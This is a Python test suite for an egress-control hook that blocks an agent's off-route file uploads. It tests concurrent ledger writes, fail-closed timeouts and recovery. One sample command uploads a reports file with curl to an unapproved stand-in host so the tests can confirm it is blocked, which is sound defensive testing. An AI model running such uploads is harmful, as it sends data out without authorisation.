"""Synchronized first writes, hook decisions, bounded failure and recovery."""
from concurrent.futures import ThreadPoolExecutor
from contextlib import closing
from pathlib import Path
import sqlite3
from tempfile import TemporaryDirectory
from threading import Barrier
import time
import unittest
from unittest.mock import patch

from exfilbar.ledger import Ledger, writer_lock
from exfilbar.policy import Policy
from support import Context, ROOT, entry

ROUTES = [dict(paths=['reports/**'], to=['https://uploads.example/reports/*'])]
GOOD = 'curl -T reports/weekly.csv https://uploads.example/reports/weekly.csv'
BAD = 'curl -T reports/weekly.csv https://elsewhere.example/up'


class ConcurrentWriterTests(unittest.TestCase):
    def test_documented_first_block_records_only_real_dispatch(self):
        command = (ROOT / 'tests/fixtures/first-block.txt').read_text().splitlines()[0]
        module = entry()
        ctx = Context(routes=ROUTES)
        module.register(ctx)
        self.assertIn('BLOCK', ctx.commands['exfil']('check ' + command, session_id='newcomer'))
        self.assertEqual(module.Ledger().read('newcomer')['events'], [])
        result = ctx.hooks['pre_tool_call']('terminal', {'command': command}, session_id='newcomer')
        self.assertEqual(result['action'], 'block')
        self.assertIn('off route', result['message'])
        feed = module.Ledger().read('newcomer')
        self.assertEqual((feed['out'], feed['blocked']), (0, 1))
        self.assertIn('uploads.example', feed['events'][0]['rule'])

    def test_changed_policy_under_external_lock_stays_bounded_and_recovers(self):
        module = entry()
        ctx = Context(routes=ROUTES)
        module.register(ctx)
        with closing(module.Ledger().connect()) as writer:
            writer.execute('BEGIN EXCLUSIVE')
            ctx.settings['routes'] = [dict(paths=['reports/**'], to=['*'])]
            started = time.perf_counter()
            result = ctx.hooks['pre_tool_call']('terminal', {'command': GOOD}, session_id='s')
            elapsed = time.perf_counter() - started
            self.assertEqual(result['action'], 'block')
            self.assertIn('session feed unavailable', result['message'])
            self.assertLess(elapsed, 0.1)
            writer.rollback()
        self.assertIsNone(ctx.hooks['pre_tool_call']('terminal', {'command': GOOD}, session_id='s'))
        self.assertEqual(module.Ledger().read('s')['out'], 1)
        print(f'WRITERS | external lock with changed policy | {elapsed * 1000:.3f} ms')

    def test_twenty_fresh_databases_with_sixteen_concurrent_writers(self):
        maximum = 0
        with TemporaryDirectory() as root, ThreadPoolExecutor(max_workers=16) as pool:
            for iteration in range(20):
                directory = Path(root) / str(iteration)
                gate = Barrier(16, timeout=5)
                def write(index):
                    policy = Policy(routes=ROUTES)
                    policy.evaluate(GOOD)
                    ledger = Ledger(directory)
                    elapsed = []
                    for _ in range(3):
                        gate.wait()
                        started = time.perf_counter()
                        try:
                            ledger.record('parallel', 'terminal', policy.inspection)
                        except Exception:
                            gate.abort()
                            raise
                        elapsed.append(time.perf_counter() - started)
                    return max(elapsed)
                maximum = max(maximum, *pool.map(write, range(16)))
                self.assertEqual(Ledger(directory).read('parallel')['out'], 48)
        self.assertLess(maximum, 0.1)
        print(f'WRITERS | 20 fresh stores x 16 writers x 3 rounds | {maximum * 1000:.3f} ms maximum')

    def test_concurrent_registered_hooks_preserve_pass_block_and_feed(self):
        module = entry()
        ctx = Context(routes=ROUTES)
        module.register(ctx)
        # Registration normally initializes storage. Also cover storage removed
        # before first dispatch, so hooks themselves race to initialize it.
        (Path(module._test_directory.name) / 'egress.db').unlink()
        gate = Barrier(16, timeout=5)
        def call(index):
            gate.wait()
            start = time.perf_counter()
            result = ctx.hooks['pre_tool_call']('terminal',
                {'command': BAD if index % 2 else GOOD}, session_id='parallel')
            if index % 2:
                self.assertEqual(result['action'], 'block')
                self.assertIn('off route', result['message'])
            else:
                self.assertIsNone(result)
            return time.perf_counter() - start
        with ThreadPoolExecutor(max_workers=16) as pool:
            maximum = max(pool.map(call, range(16)))
        self.assertLess(maximum, 0.1)
        feed = module.Ledger().read('parallel')
        self.assertEqual((feed['out'], feed['blocked']), (8, 8))
        print(f'WRITERS | 16 registered hooks, cold store | {maximum * 1000:.3f} ms maximum')

    def test_queue_timeout_fails_closed_and_recovers(self):
        module = entry()
        ctx = Context(routes=ROUTES)
        module.register(ctx)
        ledger = module.Ledger()
        # The entry harness loads its own package instance, as Hermes does.
        import sys
        gate = sys.modules[ledger.__class__.__module__].writer_lock(ledger.directory)
        # Force mirror publication too: its waits must share the hook budget.
        ctx.settings['routes'] = [dict(paths=['reports/**'], to=['*'])]
        with gate:
            started = time.perf_counter()
            result = ctx.hooks['pre_tool_call']('terminal', {'command': GOOD}, session_id='s')
            self.assertEqual(result['action'], 'block')
            self.assertIn('session feed unavailable', result['message'])
            self.assertLess(time.perf_counter() - started, 0.1)
        self.assertEqual(ledger.read('s')['events'], [])
        self.assertIsNone(ctx.hooks['pre_tool_call']('terminal', {'command': GOOD}, session_id='s'))
        self.assertEqual(ledger.read('s')['out'], 1)

    def test_failed_initialization_releases_gate_and_schema_is_atomic(self):
        with TemporaryDirectory() as directory:
            ledger = Ledger(directory)
            policy = Policy(routes=ROUTES)
            policy.evaluate(GOOD)
            # Cause real DDL failure after the sessions table would be created.
            with closing(sqlite3.connect(Path(directory) / 'egress.db')) as db:
                db.execute('CREATE VIEW events AS SELECT 1')
            with self.assertRaises(sqlite3.OperationalError):
                ledger.record('s', 'terminal', policy.inspection)
            with closing(sqlite3.connect(Path(directory) / 'egress.db')) as db:
                self.assertEqual(db.execute('PRAGMA user_version').fetchone()[0], 0)
                self.assertIsNone(db.execute("SELECT name FROM sqlite_master WHERE name='sessions'").fetchone())
                db.execute('DROP VIEW events')
            ledger.record('s', 'terminal', policy.inspection)
            self.assertEqual(ledger.read('s')['out'], 1)

    def test_profile_paths_do_not_share_a_writer_queue(self):
        with TemporaryDirectory() as root:
            first, second = Path(root) / 'one', Path(root) / 'two'
            gate = writer_lock(first)
            self.assertIs(gate, writer_lock(first / '..' / 'one'))
            self.assertIsNot(gate, writer_lock(second))
            policy = Policy(routes=ROUTES)
            policy.evaluate(GOOD)
            ledger = Ledger()
            with gate, patch('exfilbar.ledger.data_directory', return_value=second):
                ledger.record('s', 'terminal', policy.inspection)
                self.assertEqual(ledger.read('s')['out'], 1)
            with patch('exfilbar.ledger.data_directory', return_value=first):
                self.assertEqual(ledger.read('s')['out'], 0)
                ledger.record('s', 'terminal', policy.inspection)
                self.assertEqual(ledger.read('s')['out'], 1)

    def test_queue_contention_preserves_sqlite_busy_contract(self):
        with TemporaryDirectory() as directory:
            ledger = Ledger(directory)
            with writer_lock(Path(directory)):
                with self.assertRaises(sqlite3.OperationalError) as caught:
                    ledger.publish_routes(Policy(routes=ROUTES).routes)
            self.assertEqual(caught.exception.sqlite_errorcode, sqlite3.SQLITE_BUSY)
            self.assertEqual(caught.exception.sqlite_errorname, 'SQLITE_BUSY')
            ledger.publish_routes(Policy(routes=ROUTES).routes)
            self.assertTrue(ledger.routes()['valid'])


if __name__ == '__main__':
    unittest.main()
